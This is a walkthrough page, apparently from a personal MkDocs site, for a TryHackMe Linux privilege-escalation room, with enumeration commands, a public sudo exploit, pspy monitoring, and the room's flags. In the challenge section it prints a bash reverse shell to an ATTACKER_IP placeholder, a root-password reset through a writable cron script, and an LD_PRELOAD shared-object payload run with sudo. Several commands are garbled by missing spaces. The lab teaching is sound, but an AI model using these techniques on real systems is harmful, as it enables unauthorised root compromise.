+  <a href="#exploitation-scenario" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploitation Scenario
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#questions_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Questions:
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#task-5-challenge-writeup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Task 5: Challenge Writeup
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Task 5: Challenge Writeup">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-initial-access-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Initial Access &amp; Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-shell-as-user-frank" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Shell as user frank
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-shell-as-root-ld_preload-abuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Shell as root - LD_PRELOAD Abuse
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Conclusion
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<hr>
+<h1 id="linux-privilege-escalation-automation-tryhackme-room-walkthrough"><strong>Linux Privilege Escalation Automation TryHackMe Room Walkthrough</strong></h1>
+<hr>
+<h3 id="introduction"><strong>Introduction</strong></h3>
+<p>Linux privilege escalation is the process of moving from a low-privileged user to root by abusing misconfigurations, vulnerable software, or insecure automation. In real environments, attackers rarely rely on a single technique. Instead, they combine enumeration tools, vulnerability research, and process monitoring to uncover weak points in the system.</p>
+<p>This TryHackMe room focuses on automated enumeration tools, public exploit research, and real-time process monitoring using tools like <strong>pspy</strong> to identify and exploit privilege escalation paths.</p>
+<hr>
+<h3 id="task-2-automated-enumeration-tools"><strong>Task 2: Automated Enumeration Tools</strong></h3>
+<p>Automated scripts help quickly identify potential privilege escalation vectors such as misconfigurations, weak permissions, and known vulnerabilities.</p>
+<h4 id="common-enumeration-tools"><strong>Common Enumeration Tools</strong></h4>
+<ul>
+<li>
+<p><strong>LinPEAS</strong></p>
+<p>A widely used automated script that highlights privilege escalation opportunities such as:</p>
+<ul>
+<li>Misconfigured permissions</li>
+<li>Weak file ownership</li>
+<li>Credential leaks</li>
+<li>Kernel and software vulnerabilities</li>
+<li><strong>LinEnum</strong></li>
+</ul>
+<p>A structured enumeration tool that outputs system information in a readable format, including:</p>
+<ul>
+<li>Users and groups</li>
+<li>Cron jobs</li>
+<li>SUID binaries</li>
+<li>System configuration details</li>
+<li><strong>Linux Exploit Suggester (LES)</strong></li>
+</ul>
+<p>Compares the kernel version against known CVEs and suggests possible local privilege escalation exploits.</p>
+</li>
+<li>
+<p><strong>Linux Smart Enumeration (LSE)</strong></p>
+<p>A tiered enumeration script that increases verbosity depending on the selected level.</p>
+</li>
+<li>
+<p><strong>Linux Priv Checker</strong></p>
+<p>Automatically checks for common privilege escalation misconfigurations and highlights them inline.</p>
+</li>
+</ul>
+<h4 id="questions"><strong>Questions:</strong></h4>
+<p><strong>Run Linux Exploit Suggester to enumerate the target host. What CVE is listed as the first Possible Exploit the target is vulnerable to?</strong></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="task1.png" data-desc-position="bottom"><img alt="task1.png" src="task1.png"></a></p>
+<p><strong>Answer: CVE-2025-32463</strong></p>
+<hr>
+<h3 id="task-3-public-exploits"><strong>Task 3: Public Exploits</strong></h3>
+<p>Privilege escalation is often caused not only by misconfigurations but also by vulnerabilities in software itself. These vulnerabilities are tracked using <strong>CVE identifiers</strong> and often have publicly available exploit code.</p>
+<h4 id="methodology-for-using-public-exploits"><strong>Methodology for Using Public Exploits</strong></h4>
+<p>A structured approach is essential:</p>
+<ol>
+<li>
+<p><strong>Enumerate</strong></p>
+<ul>
+<li>Identify kernel version, OS version, running services, and SUID binaries.</li>
+<li>
+<p>Commands:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>uname<span class="w"> </span>-r
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>uname<span class="w"> </span>-a
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>cat<span class="w"> </span>/etc/os-release
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Research</strong></p>
+<ul>
+<li>Search for known exploits using:<ul>
+<li>Google</li>
+<li>GitHub</li>
+<li>searchsploit (Exploit-DB)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Evaluate</strong><ul>
+<li>Verify exploit requirements:<ul>
+<li>Dependencies (gcc, Python, etc.)</li>
+<li>Kernel compatibility</li>
+<li>Stability risks</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Exploit</strong><ul>
+<li>Transfer exploit to target (e.g., using <code>scp</code>)</li>
+<li>Compile or execute it</li>
+</ul>
+</li>
+<li><strong>Verify</strong><ul>
+<li>
+<p>Confirm privilege escalation:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>whoami
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>id
+</code></pre></div>
+</li>
+</ul>
+</li>
+</ol>
+<hr>
+<p>Being told the CVE that was identified in the previous task (CVE-2025-32463) is the same vulnerability this machine was vulnerable to, a public exploit was located transferred to the target machine using:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>scp<span class="w"> </span>-r<span class="w"> </span>CVE-2025-32463/<span class="w"> </span>john@10.114.175.101:/home/john/
+</code></pre></div>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="task_2-2.png" data-desc-position="bottom"><img alt="task 2-2.png" src="task_2-2.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="task_2.png" data-desc-position="bottom"><img alt="task 2.png" src="task_2.png"></a></p>
+<p>After execution, root access was achieved.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="task_2-3.png" data-desc-position="bottom"><img alt="task 2-3.png" src="task_2-3.png"></a></p>
+<h4 id="question-exploit-the-previously-identified-vulnerability-what-is-the-content-of-rootflagtxt"><strong>Question: Exploit the previously identified vulnerability. What is the content of /root/flag.txt?</strong></h4>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>THM{splo1ts-r-public}
+</code></pre></div>
+<hr>
+<h3 id="task-4-process-monitoring-with-pspy"><strong>Task 4: Process Monitoring with pspy</strong></h3>
+<p>Automated enumeration tools only provide a snapshot of the system. They cannot observe short-lived or scheduled processes such as cron jobs. This is where <strong>pspy</strong> becomes useful.</p>
+<h4 id="what-is-pspy"><strong>What is pspy?</strong></h4>
+<p><strong>pspy</strong> is a process monitoring tool that allows unprivileged users to observe:</p>
+<ul>
+<li>Running processes from other users</li>
+<li>Cron jobs</li>
+<li>Short-lived root processes</li>
+</ul>
+<p>It works without root privileges and does not modify the system.</p>
+<h4 id="how-it-works"><strong>How it works</strong></h4>
+<ul>
+<li>Uses filesystem event monitoring (inotify)</li>
+<li>Watches directories like <code>/etc</code>, <code>/tmp</code>, <code>/usr</code>, <code>/var</code></li>
+<li>Detects new processes via <code>/proc</code></li>
+<li>Captures:<ul>
+<li>UID</li>
+<li>PID</li>
+<li>Command executed</li>
+</ul>
+</li>
+</ul>
+<p>This allows visibility into root processes that would normally disappear too quickly to detect.</p>
+<hr>
+<h4 id="exploitation-scenario"><strong>Exploitation Scenario</strong></h4>
+<p>pspy was executed from:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>/home/john/pspy64
+</code></pre></div>
+<p>After monitoring system activity, a root-level process was observed executing a script:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>/var/local/syslog-backup.sh
+</code></pre></div>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="task_3-1.png" data-desc-position="bottom"><img alt="task 3-1.png" src="task_3-1.png"></a></p>
+<p>Further inspection revealed it was writable and could be modified.</p>
+<p>The vulnerable script was modified to include a privilege escalation command:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">"root:newpass"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>chpasswd
+</code></pre></div>
+<p>Since the script runs as root, this change allowed password modification for the root user.</p>
+<p>Then root access was obtained via:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>su
+</code></pre></div>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="task_3.png" data-desc-position="bottom"><img alt="task 3.png" src="task_3.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="task_3-2.png" data-desc-position="bottom"><img alt="task 3-2.png" src="task_3-2.png"></a></p>
+<hr>
+<h4 id="questions_1"><strong>Questions:</strong></h4>
+<ul>
+<li>
+<p>What is the full path of the script vulnerable to privilege escalation?</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>/var/local/syslog-backup.sh
+</code></pre></div>
+</li>
+<li>
+<p>What is the flag in&nbsp;<code>/root/flag.txt</code>?</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>THM{getting-root-with-pspy}
+</code></pre></div>
+</li>
+</ul>
+<hr>
+<h3 id="task-5-challenge-writeup"><strong>Task 5: Challenge Writeup</strong></h3>
+<p>The objective of this machine was to escalate privileges from a low-privileged user (<code>john → frank → root</code>) and retrieve the root flag located at <code>/root/flag.txt</code>.</p>
+<hr>
+<h4 id="1-initial-access-enumeration"><strong>1. Initial Access &amp; Enumeration</strong></h4>
+<p>After using ssh to access the system as <code>john</code>, the first step was standard enumeration:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>whoami
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>id
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>sudo-l
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>find /-perm-4000-type f2&gt;/dev/null
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>getcap-r /
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>cat /etc/crontab
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>ls /etc/cron.d
+</code></pre></div>
+<p>Key findings:</p>
+<ul>
+<li>User: <code>frank</code></li>
+<li>No direct sudo shell access</li>
+<li>Multiple SUID binaries present (standard system binaries only)</li>
+</ul>
+<p>During enumeration of scheduled tasks:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>cat /etc/cron.d/frank-backup
+</code></pre></div>
+<p>The following entry was discovered:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>* * * * * frank /opt/scripts/backup.sh
+</code></pre></div>
+<p>This indicated:</p>
+<blockquote>
+<p>The script <code>/opt/scripts/backup.sh</code> is executed every minute as user <code>frank</code>.
+</p>
+</blockquote>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="task_4-to-frank1.png" data-desc-position="bottom"><img alt="task 4-to-frank1.png" src="task_4-to-frank1.png"></a></p>
+<hr>
+<h4 id="2-shell-as-user-frank"><strong>2. Shell as user <code>frank</code></strong></h4>
+<p>The script was found to be <strong>writable</strong>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>ls-l /opt/scripts/backup.sh
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>-rwxrwxrwx1 frank frank ...
+</code></pre></div>
+<p>This meant:</p>
+<ul>
+<li>Any command added to this script would be executed as <code>frank</code></li>
+<li>Since cron runs it automatically, this provided a privilege escalation vector</li>
+</ul>
+<p>The script was modified to include a reverse shell payload:</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="task_4-to-frank2.png" data-desc-position="bottom"><img alt="task 4-to-frank2.png" src="task_4-to-frank2.png"></a></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>bash-i &gt;&amp; /dev/tcp/&lt;ATTACKER_IP&gt;/44440&gt;&amp;1
+</code></pre></div>
+<p>On the attacker machine:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>nc-lvnp4444
+</code></pre></div>
+<p>Once the cron job executed, a reverse shell was received as:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>frank@challenge:~$
+</code></pre></div>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="task_4-to-frank3.png" data-desc-position="bottom"><img alt="task 4-to-frank3.png" src="task_4-to-frank3.png"></a></p>
+<p>This granted stable access to the <code>frank</code> user context.</p>
+<hr>
+<h4 id="3-shell-as-root-ld_preload-abuse"><strong>3. Shell as root - LD_PRELOAD Abuse</strong></h4>
+<p>The final escalation vector was identified in sudo configuration:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>env_keep+=LD_PRELOAD
+</code></pre></div>
+<p>This allowed dynamic library injection into root-executed binaries.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="task_4-to-root.png" data-desc-position="bottom"><img alt="task 4-to-root.png" src="task_4-to-root.png"></a></p>
+<hr>
+<p><strong>Step 1 – Malicious shared object creation</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>#include &lt;stdlib.h&gt;
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>__attribute__((constructor))voidrun() {
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>system("cat /root/flag.txt");
+<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>}
+</code></pre></div>
+<hr>
+<p><strong>Step 2 – Compile shared library</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>gcc -fPIC -shared -o pwn.so pwn.c
+</code></pre></div>
+<hr>
+<p><strong>Step 3 – Execute via sudo with preserved environment</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>sudo LD_PRELOAD=/tmp/pwn.so /usr/bin/id
+</code></pre></div>
+<hr>
+<p>The payload executed in root context and printed:</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="task_4-to-root_2.png" data-desc-position="bottom"><img alt="task 4-to-root 2.png" src="task_4-to-root_2.png"></a></p>
+<p>Root-level access was successfully achieved.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>THM{Priv_Ch@l_D0ne}
+</code></pre></div>
+<hr>
+<h3 id="conclusion"><strong>Conclusion</strong></h3>
+<p>This room demonstrates three core privilege escalation techniques:</p>
+<ul>
+<li>Automated enumeration tools for initial reconnaissance</li>
+<li>Public exploit research for kernel/software vulnerabilities</li>
+<li>Real-time process monitoring using pspy to catch hidden automation</li>
+</ul>
+<p>Together, these methods show how privilege escalation is often a combination of enumeration, timing, and understanding system automation rather than a single exploit.</p>
+<p>This challenge demonstrated that privilege escalation is not always about kernel exploits or SUID binaries. Instead, subtle misconfigurations in <code>sudo</code> environment handling can allow full root compromise through dynamic library injection.</p>
+<p>The final attack chain was:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>Writable cron script → shell as frank → sudo env_keep misconfiguration → LD_PRELOAD injection → root execution
+</code></pre></div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden="">
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"></path></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/c0rnyx" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"></path></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://tryhackme.com/p/sam11" target="_blank" rel="noopener" title="tryhackme.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M256 0c4.6 0 9.2 1 13.4 2.9l188.4 79.9c22 9.3 38.4 31 38.3 57.2-.5 99.2-41.3 280.7-213.6 363.2-16.7 8-36.1 8-52.8 0C57.3 420.7 16.6 239.2 16.1 140c-.1-26.2 16.3-47.9 38.3-57.2L242.7 2.9C246.9 1 251.4 0 256 0"></path></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.instant", "navigation.sections", "navigation.expand", "navigation.top", "navigation.tabs", "search.highlight", "content.code.copy"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  
+<script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(()=>{ lightbox.reload(); });
+</script></body></html>
